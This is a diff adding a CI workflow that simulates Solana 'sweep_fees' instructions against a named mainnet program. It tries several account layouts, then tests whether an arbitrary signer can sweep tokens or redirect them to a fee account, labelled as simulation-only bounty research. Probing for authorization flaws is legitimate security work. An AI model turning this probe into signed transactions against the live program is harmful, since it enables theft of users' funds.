@@ -1,0 +1,39 @@
+name: mayhem-sweep-exact-runtime
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/mayhem-sweep-exact-runtime.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @solana/web3.js @solana/spl-token
+      - name: Simulation-only exact SweepFees layout and auth differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token'; import crypto from 'node:crypto';
+          const pk=s=>new PublicKey(s); const P=pk('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e'),G=pk('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ'),T=pk('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA'),R=pk('Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1'),Q=pk('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),SYS=pk('11111111111111111111111111111111'),FEE=pk('GesfTA3X2arioaHp8bbKdjG9vJtskViWACZoYvxp4twS');
+          const TATA=getAssociatedTokenAddressSync(Q,T,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),FATA=getAssociatedTokenAddressSync(Q,FEE,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),[EV]=PublicKey.findProgramAddressSync([Buffer.from('__event_authority')],P),disc=crypto.createHash('sha256').update('global:sweep_fees').digest().subarray(0,8);const URL='https://api.mainnet-beta.solana.com';let id=1;
+          async function rpc(method,params){const r=await fetch(URL,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-sweep-exact/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result} const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash, m=(p,s=false,w=false)=>({pubkey:p,isSigner:s,isWritable:w});
+          const layouts={
+            sys_tok_evt_prog:(tr,ata)=>[m(tr,true,true),m(G,false,true),m(Q),m(ata,false,true),m(SYS),m(TOKEN_PROGRAM_ID),m(EV),m(P)],
+            sys_tok:(tr,ata)=>[m(tr,true,true),m(G,false,true),m(Q),m(ata,false,true),m(SYS),m(TOKEN_PROGRAM_ID)],
+            sys_tok_prog_evt:(tr,ata)=>[m(tr,true,true),m(G,false,true),m(Q),m(ata,false,true),m(SYS),m(TOKEN_PROGRAM_ID),m(P),m(EV)],
+            tok_sys_evt_prog:(tr,ata)=>[m(tr,true,true),m(G,false,true),m(Q),m(ata,false,true),m(TOKEN_PROGRAM_ID),m(SYS),m(EV),m(P)]
+          };
+          async function sim(label,keys){const ix=new TransactionInstruction({programId:P,keys,data:disc});const msg=new TransactionMessage({payerKey:T,recentBlockhash:bh,instructions:[ix]}).compileToV0Message();const tx=new VersionedTransaction(msg);const v=(await rpc('simulateTransaction',[Buffer.from(tx.serialize()).toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'}])).value;console.log('\n===',label,'===');console.log('ERR',JSON.stringify(v.err),'UNITS',v.unitsConsumed);for(const l of v.logs??[])console.log(l);return v}
+          let good=null;
+          for(const [ln,fn] of Object.entries(layouts)){const v=await sim('layout_'+ln,fn(T,TATA));const text=(v.logs??[]).join('\n');if(!/AccountNotEnoughKeys|InvalidProgramId|AccountOwnedByWrongProgram|ConstraintSeeds|ConstraintAddress|AccountNotInitialized|AccountDiscriminatorMismatch/.test(text)){good={ln,fn};console.log('HANDLER_LAYOUT',ln);break}}
+          if(!good){console.log('NO_HANDLER_LAYOUT');process.exit(0)}
+          await sim('control_trader_own_ata',good.fn(T,TATA));
+          await sim('arbitrary_signer_trader_ata',good.fn(R,TATA));
+          await sim('arbitrary_signer_fee_ata',good.fn(R,FATA));
+          await sim('real_trader_fee_ata_redirect',good.fn(T,FATA));
+          NODE
